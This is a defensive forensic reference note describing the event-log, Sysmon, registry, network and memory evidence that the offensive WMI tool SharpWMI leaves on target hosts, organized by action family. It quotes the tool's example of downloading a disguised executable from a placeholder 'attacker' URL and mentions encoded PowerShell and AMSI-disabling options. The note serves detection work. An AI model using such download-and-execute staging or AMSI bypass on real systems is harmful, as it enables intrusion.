# SharpWMI — Target Evidence

Evidence left on the **target/destination** host — whichever machine `computername=` names, or the local host itself if omitted. Per `01 - Overview.md`, SharpWMI's actions split into three families with genuinely different evidentiary footprints, and this file keeps them separate throughout rather than presenting one blended picture:

- **The query/enumeration family** (`query`, `loggedon`, `firewall`, `ps`, `getenv`) — read-only WQL queries, no process creation, no repository write.
- **The `Win32_Process.Create()` method-call family** (`exec`/`create`, `terminate`, `setenv`, `delenv`, `install`) — leaves a `WmiPrvSE.exe`-unexpected-child signature for `exec`, and (for `setenv`/`delenv` specifically) a registry write most sibling WMI-execution tools in this repo don't produce at all.
- **The `executevbs` event-subscription family** — the one action that genuinely writes into the WMI repository, registering a real `__EventFilter`/`ActiveScriptEventConsumer`/`__FilterToConsumerBinding` triad and producing an evidence trail that overlaps meaningfully with WMI *persistence* (T1546.003), not just execution.

## Contents
- [Filesystem](#filesystem)
- [Registry](#registry)
- [Windows Event Logs](#windows-event-logs)
- [Sysmon (if deployed)](#sysmon-if-deployed)
- [DCOM / RPC Detail](#dcom--rpc-detail)
- [Network-Layer Evidence](#network-layer-evidence)
- [Endpoint Security Product Signatures](#endpoint-security-product-signatures)
- [Memory Forensics](#memory-forensics)
- [Building a Timeline](#building-a-timeline)
- [Contrast Across SharpWMI's Three Families](#contrast-across-sharpwmis-three-families)

---

## Filesystem

| Artifact | Detail |
|---|---|
| Output-relay file | **None, ever** — SharpWMI's `result=true` output-capture mechanism stores command output as a property on an ad hoc WMI object, read back over the same WMI connection (per `01`). This is a structural difference from `wmiexec.py`'s `__<timestamp>` loopback-SMB file: there is no equivalent artifact to hunt for at all, regardless of which SharpWMI action was used |
| `upload` destination file | An ordinary new file at whatever `dest=` path was given — no `wmic`/`SharpWMI`-specific naming convention. The exact transport mechanism isn't confirmed from the README (see `01`), but the resulting file-create event looks like any other file write |
| `executevbs` download artifacts (methods C/D) | A binary written to whatever path the `url="SOURCE_URL,TARGET_PATH"` argument specifies — the README's own example (`url="http://attacker/foo.png,%TEMP%\bar.exe"`) uses a disguised extension (`.png` masking an executable) as its illustrative pattern, worth flagging as a staging habit on its own regardless of the actual filenames an operator chooses |
| `install` MSI file | The MSI at whatever `path=` names — a normal file if pre-staged, or newly written if delivered as part of the same operation |
| Prefetch | `WMIPRVSE.EXE-<HASH>.pf` for `exec`/`terminate`/`setenv`/`delenv`/`install`-family actions (same as `wmiexec.py`/`wmic.exe`, per `Impacket/wmiexec/04 - Target Evidence.md`); for `executevbs`, expect **also** a `SCRCONS.EXE-<HASH>.pf` entry — a genuinely new artifact class this note's sibling pages (`wmiexec`, `wmic`) don't produce, since neither of those tools' execution paths ever invoke the WMI ActiveScript event-consumer host. See `Windows/06 - Evidence of Program Execution/Prefetch.md` |
| Amcache / ShimCache | Record whichever binaries actually ran (`WmiPrvSE.exe`, `scrcons.exe`, `cmd.exe`/`powershell.exe`/the named `command=` target) — low-uniqueness signal on its own, same caveat as `wmiexec.py`'s equivalent finding. See `Windows/06 - Evidence of Program Execution/Amcache.md` and `.../ShimCache (AppCompatCache).md` |
| Zone.Identifier / MOTW | Not applicable to anything created directly by `exec`/`query`/etc. If a downloaded `executevbs` payload (methods B/C/D) or an `install` MSI is later opened through a MOTW-aware application, standard MOTW rules would apply to *that* file — but delivery here is over WMI/DCOM/HTTP(S), not a browser/mail client, so MOTW propagation isn't guaranteed and wasn't independently confirmed for this note |

## Registry

**The query and `Win32_Process.Create()` method-call families touch no registry key and no WBEM repository at all** — identical finding to `Impacket/wmiexec/04 - Target Evidence.md` and `LOLBins/wmic/04 - Target Evidence.md`: a one-shot method call or a WQL query doesn't register anything under `CurrentControlSet\Services` and doesn't touch `HKLM\SOFTWARE\Microsoft\WBEM`.

**Two real exceptions specific to SharpWMI, both worth flagging clearly:**

1. **`setenv`/`delenv` write to the registry.** WMI's `Win32_Environment` class is backed directly by the registry — `Create()`/`Delete()` calls against it write to `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` (system-scoped) or `HKCU\Environment` (user-scoped), per Microsoft's own documented behavior for that class. This is well-established general WMI-class behavior, not something independently re-verified against SharpWMI's own source for this note (out of the README-only research scope) — but it means `setenv`/`delenv` are the **only** SharpWMI actions in the method-call family that generate a Sysmon 13 (Registry Value Set)-style artifact at all, a genuine point of difference from every process-creation-centric technique documented in the sibling `wmiexec`/`wmic` pages.
2. **`executevbs` writes real, persistent-style objects into the WMI repository.** Registering a `__EventFilter`/`ActiveScriptEventConsumer`/`__FilterToConsumerBinding` triad in `root\subscription` is the exact same mechanism [`Windows/10 - Persistence Mechanisms/WMI Event Consumers.md`](<../../../Windows/10%20-%20Persistence%20Mechanisms/WMI%20Event%20Consumers.md>) documents in full for genuine WMI persistence — full field layout (`__EventFilter.Query`/`Name`, `ActiveScriptEventConsumer.ScriptText`/`ScriptingEngine`, `__FilterToConsumerBinding.Filter`/`Consumer`), repository storage location (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`), and hunting/parsing methodology are covered there and **not re-derived here**. `01`'s open question — whether SharpWMI's `trigger=`/`timeout=` cleanup logic reliably deletes the triad after firing — is the reason this note treats any triad found on a host as needing the same full-review discipline as confirmed persistence, regardless of SharpWMI's own self-cleaning intent.

## Windows Event Logs

| Log | Event ID | Signal |
|---|---|---|
| **Microsoft-Windows-WMI-Activity/Operational** | **5857** | `Operation_Started` — fires for **every** SharpWMI action across all three families, including plain `query`/`loggedon`/`firewall`/`ps`/`getenv` reads, since a WMI query is itself a WMI provider operation. `HostProcess` set to `wmiprvse.exe`. High-recall, low-precision on its own — correlate against source IP/account |
| Microsoft-Windows-WMI-Activity/Operational | 5858 | `Operation_ClientFailure` — only on error (access denied, malformed query, blocked by EDR) |
| **Microsoft-Windows-WMI-Activity/Operational** | **5859** | `EventFilter_Registered` — **`executevbs` only.** Fires when the `__EventFilter` half of the triad is registered, with the filter's `Name`/`Query` in the event data. This is the exact ID `Impacket/wmiexec/04 - Target Evidence.md` explicitly rules out as inapplicable to `Win32_Process.Create()`-based execution — for SharpWMI's `executevbs` specifically, it's a real, expected signal |
| **Microsoft-Windows-WMI-Activity/Operational** | **5860** | `EventConsumer_Registered` — **`executevbs` only.** Fires when the `ActiveScriptEventConsumer` is registered, with the consumer type and (per `Windows/10 - Persistence Mechanisms/WMI Event Consumers.md`) its script content potentially recoverable from the event data |
| **Microsoft-Windows-WMI-Activity/Operational** | **5861** | `FilterToConsumerBinding_Registered` — **`executevbs` only.** Fires when the triad is completed, linking the filter and consumer into a live subscription |
| Security | 4624 (Logon Type 3 — Network) | For any **remote** action — absent entirely for local-only invocations (`computername` omitted). Check `AuthenticationPackageName` for `NTLM` vs `Kerberos` |
| Security | 4672 | Special privileges assigned to the new logon — confirms an admin-equivalent token, required for `Win32_Process.Create()`, `Win32_Environment` writes, and `__EventFilter`/`__EventConsumer` registration to succeed |
| Security | 4688 | Process creation, with command-line auditing enabled — shows `WmiPrvSE.exe` launching whatever `exec`'s `command=` named (see the process-tree note in Sysmon below), or `scrcons.exe`'s own child for `executevbs` |
| Security | 4689 | Process termination |
| System | 10016 (Microsoft-Windows-DistributedCOM) | Fires when an account lacks the DCOM launch/activation permissions WMI needs — a common, noisy System-log event, worth checking as a failed-attempt indicator alongside WMI-Activity 5858. Not exclusive to this tool |

**Accuracy note, consistent with the precedent set in this repo's sibling pages:** [`Impacket/wmiexec/04 - Target Evidence.md`](<../../Impacket/wmiexec/04%20-%20Target%20Evidence.md>) and [`LOLBins/wmic/04 - Target Evidence.md`](<../../LOLBins/wmic/04%20-%20Target%20Evidence.md>) both correctly state that WMI-Activity 5859/5860/5861 do **not** apply to their tools' `Win32_Process.Create()`-based execution — those IDs belong to permanent WMI event-subscription registration. **SharpWMI is the exception in this repo's WMI-execution-tool coverage**: because `executevbs` genuinely registers a filter/consumer/binding triad (even if only transiently, per `01`'s framing), 5859/5860/5861 are real, expected artifacts for that one action specifically — while remaining just as inapplicable as ever to SharpWMI's own `query`/`exec`/`terminate`/`setenv`/`delenv`/`install`/`upload`/`firewall`/`ps`/`loggedon` actions. Don't apply 5859-5861 to a SharpWMI hunt scoped to anything other than `executevbs`.

## Sysmon (if deployed)

| Event ID | Signal |
|---|---|
| 1 (Process Create) | **`exec` family:** `WmiPrvSE.exe` launching the `command=` target as a **direct child** — the README's own usage examples show `command=` values like `"whoami"` and `"powershell.exe -enc ..."` passed as complete command lines with no visible `cmd.exe /c` wrapper syntax, and nothing in the README documents SharpWMI adding one automatically the way `wmiexec.py`'s source explicitly does by default. Treat this as a strong inference from the README's usage examples rather than a source-verified fact (out of this note's README-only research scope) — but it means a SharpWMI `exec` invocation likely produces `WmiPrvSE.exe`-direct-child evidence closer to `wmiexec.py`'s `-silentcommand` mode than to its noisier `cmd.exe`-wrapped default. **`executevbs` family:** `WmiPrvSE.exe` spawns `scrcons.exe` (the WMI ActiveScript event-consumer host) as an intermediate hop, and `scrcons.exe` — not `WmiPrvSE.exe` — is the actual parent of whatever the VBScript spawns. This extra hop is the single most important process-tree difference from every other WMI-execution tool documented in this repo, and it means a hunt keyed strictly on "`WmiPrvSE.exe` direct child" will **miss** `executevbs`-driven execution entirely; a triage rule needs to also chase `scrcons.exe`'s own children |
| 3 (Network Connect) | DCOM/RPC (135 + dynamic high port) for any remote action; HTTP(S) or SMB from `scrcons.exe`'s VBS-spawned process for `executevbs` methods B/C/D's download step |
| 11 (File Create) | The `upload` destination file, the `executevbs` download-and-execute target (methods C/D), or the `install` MSI — **not** generated for `query`/`loggedon`/`exec`/`terminate`/`ps`/`firewall`, none of which create a new file |
| 13 (Registry Value Set) | **`setenv`/`delenv` only**, per the Registry section above — not generated by any other action |
| 19 / 20 / 21 (WmiEvent: WmiEventFilter / WmiEventConsumer / WmiEventConsumerToFilter) | **`executevbs` only**, if Sysmon's WMI-event-tracing config is enabled (it is not part of Sysmon's default ruleset — a targeted config addition is required). Directly parallel to WMI-Activity 5859/5860/5861 above, and — per `Windows/10 - Persistence Mechanisms/WMI Event Consumers.md` — this is the Sysmon-side equivalent of that page's registration-hunting methodology, not re-derived here |
| 22 (DNS Query) | Hostname resolution preceding an `executevbs` URL fetch or a `computername=` target resolution |

## DCOM / RPC Detail

Every remote SharpWMI action rides the same DCE/RPC-over-TCP channel already documented in `Impacket/wmiexec/04 - Target Evidence.md`: a bind to the RPC endpoint mapper on **TCP 135**, which hands back a dynamically assigned high port for the actual `IWbemServices`/`IWbemLevel1Login` calls. Per Microsoft's [KB929851](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/default-dynamic-port-range-tcpip-chang), already cited in `LOLBins/wmic/04 - Target Evidence.md`, the default dynamic port range on Vista/Server 2008 and later is **49152-65535**. This applies identically to SharpWMI — it's a property of the OS's RPC endpoint-mapper behavior, not of any individual tool — and is not re-derived further here.

## Network-Layer Evidence

| Source | What It Shows |
|---|---|
| Zeek `dce_rpc.log` | The RPC bind and subsequent WMI-interface operations — present for **every** remote SharpWMI action, including plain `query`/`loggedon`/`firewall`/`ps`/`getenv` reads |
| Zeek `http.log` | The `executevbs` PowerShell-via-stdin (method B) or binary-download (methods C/D) fetch, if URL-sourced — full request URI recoverable |
| Zeek `smb_files.log` | **Not generated by SharpWMI's own `upload` action** — unlike `wmiexec.py`'s `lput`, `upload`'s exact transport isn't confirmed as SMB-based (per `01`); if it rides the same WMI-object channel as `result=true`, it would show up in `dce_rpc.log` instead, not here. Treat `smb_files.log` visibility into `upload`'s traffic as unconfirmed |
| NetFlow / firewall logs | A TCP 135 + dynamic-high-port burst for any remote action, plus an HTTP(S) session for `executevbs` methods B/C/D specifically |

## Endpoint Security Product Signatures

**No static hash to match** — per `01`, zero official binaries are ever released, so static AV signature detection against SharpWMI itself is inherently brittle. Detection depends on behavioral heuristics, and SharpWMI's three-family design gives EDR products three distinct behavioral surfaces to key on:

- `WmiPrvSE.exe` spawning an unexpected direct child (`exec` family) — the same heuristic that catches `wmiexec.py`/`wmic.exe`.
- `WmiPrvSE.exe` spawning `scrcons.exe`, which itself then spawns an unexpected child (`executevbs` family) — a heuristic most EDR WMI-execution rules built around `wmiexec.py`/`wmic.exe`'s simpler `WmiPrvSE.exe`-direct-child pattern will **not** catch without an explicit `scrcons.exe`-lineage rule.
- `amsi=disable`'s effect on the **target**: AMSI-instrumentation coverage of whatever `command=`/VBS-delivered payload runs afterward depends on whether the AMSI-disable code (credited to `SharpMove`, per `01`'s Authors table) actually succeeds against that specific target's AMSI provider configuration — not independently confirmed for this note, flagged as an open question consistent with how `LOLBins/wmic/04 - Target Evidence.md` handles its own unresolved AMSI-coverage question for the XSL family.

A modern EDR product should generate a WMI-execution- or WMI-event-subscription-specific behavioral alert independent of any hash match for at least the `exec` and `executevbs` families; the absence of such an alert on a host that otherwise shows the WMI-Activity 5857 (or, for `executevbs`, 5859/5860/5861) pattern is worth investigating on its own.

## Memory Forensics

`WmiPrvSE.exe`, `scrcons.exe`, and their spawned children run as ordinary, non-hidden, typically short-lived processes — standard process-listing/injection-detection tooling (see `Windows/17 - Memory Forensics/Memory Analysis (Processes, Injection, Rootkits).md`) shows nothing structurally unusual about any of them. The more interesting memory-forensics angle is specific to `executevbs`: the registered `ActiveScriptEventConsumer`'s `ScriptText` property is written into the live WMI repository (`OBJECTS.DATA`) as part of registration — per `Windows/10 - Persistence Mechanisms/WMI Event Consumers.md`, this makes the **actual VBScript payload** recoverable from a repository parse even after the process tree it spawned has long since exited, and (if `01`'s cleanup-on-every-code-path question resolves in SharpWMI's favor) potentially recoverable **only** during the trigger/timeout window before the tool's own cleanup runs — making a timely repository snapshot or live memory capture the only reliable way to recover the script content on a host examined after the fact.

## Building a Timeline

**Query/enumeration family:** `[Security 4624 Type 3 + 4672, remote only]` → WMI-Activity 5857 → query results returned over the existing connection, no further target-side artifact.

**`Win32_Process.Create()` method-call family (`exec`, `terminate`, `setenv`/`delenv`, `install`):** `[Security 4624 Type 3 + 4672, remote only]` → WMI-Activity 5857 → Sysmon 1 (`WmiPrvSE.exe` → `command=` target, direct child per the process-tree note above) → `[Sysmon 13, setenv/delenv only]` → `[Sysmon 11, install/upload only]` → Security 4689 (process termination, if applicable).

**`executevbs` event-subscription family:** `[Security 4624 Type 3 + 4672, remote only]` → WMI-Activity 5857 (the underlying provider load) → WMI-Activity 5859 (`__EventFilter` registered) → 5860 (`ActiveScriptEventConsumer` registered) → 5861 (`__FilterToConsumerBinding` registered) → `[trigger=N second delay]` → Sysmon 1 (`WmiPrvSE.exe` → `scrcons.exe`) → Sysmon 1 (`scrcons.exe` → VBScript-spawned payload) → `[Sysmon 3 / Zeek http.log, methods B/C/D only]` → `[timeout=N second wait]` → **presumed** triad cleanup (unconfirmed, per `01`). A host showing 5859/5860/5861 with **no** corresponding `WmiPrvSE.exe → scrcons.exe` Sysmon 1 pair shortly after is either mid-trigger-delay (catch it live) or represents a failed/blocked execution — check WMI-Activity 5858 alongside.

## Contrast Across SharpWMI's Three Families

| Dimension | Query/enumeration | `Win32_Process.Create()` method-call | `executevbs` event-subscription |
|---|---|---|---|
| Calls `Win32_Process.Create()`? | No | Yes (`exec`) / class-specific methods (others) | **No** |
| Writes to the WMI repository? | No | Only `setenv`/`delenv` (registry, via `Win32_Environment`) | **Yes** — real `__EventFilter`/`__EventConsumer`/`__FilterToConsumerBinding` objects |
| `WmiPrvSE.exe` gets an unexpected child? | No | Yes, directly | Indirectly — via `scrcons.exe` as an intermediate hop |
| WMI-Activity 5857 | Yes | Yes | Yes |
| WMI-Activity 5859/5860/5861 | No | No | **Yes — the one action in this tool where these apply** |
| Network evidence | DCOM/RPC only | DCOM/RPC only | DCOM/RPC, plus HTTP(S) for methods B/C/D |
| Output-relay filesystem artifact | N/A (query results returned in-band) | **None** — `result=true` uses the WMI-object channel, not a file | Only if a download-and-execute method (C/D) writes a binary to disk |
| Primary distinguishing artifact | WMI-Activity 5857 correlated to source IP | Sysmon 1, `WmiPrvSE.exe` direct parent | WMI-Activity 5859-5861 triad + `scrcons.exe` in the process lineage |
| Execution context | N/A (read-only) | The authenticating user's token, never SYSTEM | Same — the VBScript runs under the WMI ActiveScript event-consumer host's own context |

See `Impacket/wmiexec/04 - Target Evidence.md` and `LOLBins/wmic/04 - Target Evidence.md` for the closest sibling comparisons, and `Windows/12 - Lateral Movement.md` for the broader WMI/DCOM lateral-movement comparison table this note doesn't re-derive.
